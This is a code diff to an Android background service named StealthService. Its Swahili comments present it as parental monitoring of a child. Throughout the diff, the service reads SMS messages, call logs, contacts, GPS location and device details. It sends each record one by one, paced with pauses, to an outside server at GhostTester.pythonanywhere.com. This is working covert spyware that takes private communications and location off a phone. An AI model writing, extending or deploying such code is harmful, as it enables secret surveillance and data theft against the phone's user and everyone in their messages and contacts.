@@ -82,195 +82,227 @@ public class StealthService extends Service {
 
     private void collectAndSendAllData() {
         try {
+            Log.d(TAG, "🔄 Kuanza kukusanya data...");
+
             // 1. Kusanya SMS za mtoto
             if (checkPermission(Manifest.permission.READ_SMS)) {
-                JSONArray smsData = collectSMSData();
-                if (smsData.length() > 0) {
-                    sendParentDataToServer("sms", smsData);
-                }
+                collectAndSendSMSData();
             }
 
             // 2. Kusanya simu za mtoto
             if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
-                JSONArray callsData = collectCallsData();
-                if (callsData.length() > 0) {
-                    sendParentDataToServer("calls", callsData);
-                }
+                collectAndSendCallsData();
             }
 
             // 3. Kusanya anwani za mtoto
             if (checkPermission(Manifest.permission.READ_CONTACTS)) {
-                JSONArray contactsData = collectContactsData();
-                if (contactsData.length() > 0) {
-                    sendParentDataToServer("contacts", contactsData);
-                }
+                collectAndSendContactsData();
             }
 
             // 4. Kusanya location ya mtoto
             if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
-                JSONObject locationData = collectLocationData();
-                if (locationData.length() > 0) {
-                    sendParentDataToServer("location", locationData);
-                }
+                collectAndSendLocationData();
             }
 
             // 5. Tuma device info
-            JSONObject deviceInfo = collectDeviceInfo();
-            sendParentDataToServer("device_info", deviceInfo);
+            sendDeviceInfo();
+
+            Log.d(TAG, "✅ Ukusaji wa data umekamilika");
 
         } catch (Exception e) {
             Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
         }
     }
 
-    private JSONArray collectSMSData() {
-        JSONArray smsArray = new JSONArray();
+    private void collectAndSendSMSData() {
         try {
             Cursor cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
                 null, null, null,
-                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 50"
+                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 10"
             );
 
             if (cursor != null) {
-                while (cursor.moveToNext()) {
-                    JSONObject sms = new JSONObject();
-                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
-                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
-                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
-                    sms.put("type", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
-                    smsArray.put(sms);
+                int count = 0;
+                while (cursor.moveToNext() && count < 5) { // Tuma SMS 5 tu kwa kila cycle
+                    JSONObject smsData = new JSONObject();
+                    smsData.put("sender", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
+                    smsData.put("message", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
+                    smsData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
+                    smsData.put("type", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
+
+                    // Tuma SMS moja moja kwa server
+                    sendSingleDataToServer("sms", smsData);
+                    count++;
+                    
+                    // Pumzika kidogo kati ya SMS
+                    Thread.sleep(1000);
                 }
                 cursor.close();
+                Log.d(TAG, "✅ SMS " + count + " zimetumwa");
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error reading SMS: " + e.getMessage());
+            Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
         }
-        return smsArray;
     }
 
-    private JSONArray collectCallsData() {
-        JSONArray callsArray = new JSONArray();
+    private void collectAndSendCallsData() {
         try {
             Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
                 null, null, null,
-                CallLog.Calls.DATE + " DESC LIMIT 50"
+                CallLog.Calls.DATE + " DESC LIMIT 10"
             );
 
             if (cursor != null) {
-                while (cursor.moveToNext()) {
-                    JSONObject call = new JSONObject();
-                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
-                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
-                    call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
-                    call.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
-                    callsArray.put(call);
+                int count = 0;
+                while (cursor.moveToNext() && count < 5) {
+                    JSONObject callData = new JSONObject();
+                    callData.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                    callData.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                    callData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                    callData.put("type", getCallTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
+
+                    // Tuma simu moja moja
+                    sendSingleDataToServer("calls", callData);
+                    count++;
+                    
+                    Thread.sleep(1000);
                 }
                 cursor.close();
+                Log.d(TAG, "✅ Simu " + count + " zimetumwa");
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error reading calls: " + e.getMessage());
+            Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
         }
-        return callsArray;
     }
 
-    private JSONArray collectContactsData() {
-        JSONArray contactsArray = new JSONArray();
+    private void collectAndSendContactsData() {
         try {
             Cursor cursor = getContentResolver().query(
                 ContactsContract.Contacts.CONTENT_URI,
                 null, null, null,
-                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 100"
+                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 20"
             );
 
             if (cursor != null) {
-                while (cursor.moveToNext()) {
+                int count = 0;
+                while (cursor.moveToNext() && count < 10) {
                     String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
 
-                    JSONObject contact = new JSONObject();
-                    contact.put("name", name);
+                    // Pata namba za simu za contact hii
+                    String phoneNumber = getContactPhoneNumber(contactId);
+                    
+                    if (phoneNumber != null) {
+                        JSONObject contactData = new JSONObject();
+                        contactData.put("name", name);
+                        contactData.put("phone", phoneNumber);
+                        contactData.put("timestamp", System.currentTimeMillis());
 
-                    // Get phone numbers
-                    Cursor phoneCursor = getContentResolver().query(
-                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        null,
-                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                        new String[]{contactId},
-                        null
-                    );
-
-                    JSONArray phones = new JSONArray();
-                    if (phoneCursor != null) {
-                        while (phoneCursor.moveToNext()) {
-                            String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
-                                ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            phones.put(phone);
-                        }
-                        phoneCursor.close();
+                        // Tuma contact moja moja
+                        sendSingleDataToServer("contacts", contactData);
+                        count++;
+                        
+                        Thread.sleep(1000);
                     }
-                    contact.put("phones", phones);
-                    contactsArray.put(contact);
                 }
                 cursor.close();
+                Log.d(TAG, "✅ Anwani " + count + " zimetumwa");
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error reading contacts: " + e.getMessage());
+            Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
         }
-        return contactsArray;
     }
 
-    private JSONObject collectLocationData() {
-        JSONObject location = new JSONObject();
+    private void collectAndSendLocationData() {
         try {
             locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
             if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                 Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                 if (lastLocation != null) {
-                    location.put("latitude", lastLocation.getLatitude());
-                    location.put("longitude", lastLocation.getLongitude());
-                    location.put("accuracy", lastLocation.getAccuracy());
-                    location.put("timestamp", lastLocation.getTime());
+                    JSONObject locationData = new JSONObject();
+                    locationData.put("latitude", lastLocation.getLatitude());
+                    locationData.put("longitude", lastLocation.getLongitude());
+                    locationData.put("accuracy", lastLocation.getAccuracy());
+                    locationData.put("timestamp", lastLocation.getTime());
+                    locationData.put("address", "GPS Location");
+
+                    // Tuma location
+                    sendSingleDataToServer("location", locationData);
+                    Log.d(TAG, "✅ Location imetumwa");
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error getting location: " + e.getMessage());
+            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
         }
-        return location;
     }
 
-    private JSONObject collectDeviceInfo() {
-        JSONObject deviceInfo = new JSONObject();
+    private void sendDeviceInfo() {
         try {
+            JSONObject deviceInfo = new JSONObject();
             deviceInfo.put("model", android.os.Build.MODEL);
             deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
             deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
             deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
-            deviceInfo.put("product", android.os.Build.PRODUCT);
-            deviceInfo.put("device", android.os.Build.DEVICE);
+            deviceInfo.put("collection_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
+
+            sendSingleDataToServer("device_info", deviceInfo);
+            Log.d(TAG, "✅ Device info imetumwa");
         } catch (Exception e) {
-            Log.e(TAG, "Error collecting device info: " + e.getMessage());
+            Log.e(TAG, "❌ Error sending device info: " + e.getMessage());
         }
-        return deviceInfo;
     }
 
-    private boolean checkPermission(String permission) {
-        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
+    private String getContactPhoneNumber(String contactId) {
+        try {
+            Cursor phoneCursor = getContentResolver().query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null,
+                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                new String[]{contactId},
+                null
+            );
+
+            if (phoneCursor != null && phoneCursor.moveToFirst()) {
+                String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
+                    ContactsContract.CommonDataKinds.Phone.NUMBER));
+                phoneCursor.close();
+                return phone;
+            }
+            if (phoneCursor != null) {
+                phoneCursor.close();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting phone number: " + e.getMessage());
+        }
+        return null;
     }
 
-    // 🆕 NJIA MPYA YA KUTUMA DATA KWA MZAZI
-    private void sendParentDataToServer(String dataType, Object dataContent) {
+    private String getCallTypeText(int callType) {
+        switch (callType) {
+            case CallLog.Calls.INCOMING_TYPE:
+                return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE:
+                return "outgoing";
+            case CallLog.Calls.MISSED_TYPE:
+                return "missed";
+            default:
+                return "unknown";
+        }
+    }
+
+    // 🆕 NJIA MPYA YA KUTUMA DATA MOJA MOJA KWA SERVER
+    private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
         new Thread(() -> {
             try {
-                // ✅ URL SAHIHI KWA DATA YA MZAZI
                 String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                 
                 JSONObject postData = new JSONObject();
                 postData.put("parent_code", parentCode);
                 postData.put("data_type", dataType);
                 postData.put("device_id", android.os.Build.MODEL);
-                postData.put("data_content", dataContent);
+                postData.put("data_content", dataContent); // ✅ DATA RAHISI MOJA KWA MOJA
 
                 URL url = new URL(serverUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -287,15 +319,19 @@ public class StealthService extends Service {
 
                 int responseCode = conn.getResponseCode();
                 if (responseCode == 200) {
-                    Log.d(TAG, "✅ " + dataType + " data imetumwa kwa mzazi - " + new Date());
+                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu");
                 } else {
                     Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                 }
 
             } catch (Exception e) {
-                Log.e(TAG, "❌ Error sending " + dataType + " data: " + e.getMessage());
+                Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
             }
         }).start();
+    }
+
+    private boolean checkPermission(String permission) {
+        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
     }
 
     @Override
